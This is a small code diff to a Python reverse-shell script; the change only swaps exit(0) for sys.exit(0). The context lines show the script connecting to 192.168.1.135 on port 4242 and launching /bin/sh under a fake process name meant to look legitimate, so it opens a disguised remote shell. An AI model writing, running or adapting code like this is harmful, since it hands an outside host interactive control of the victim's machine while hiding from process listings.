@@ -1,5 +1,6 @@
 import socket
 import os
+import sys
 IP = "192.168.1.135"
 PORT = 4242
 try:
@@ -11,5 +12,5 @@ try:
     args = ["[procesoSuperLegitimo/u:1]", "-i"]
     os.execv("/bin/sh", args)
 except Exception:
-    exit(0)
+    sys.exit(0)
 
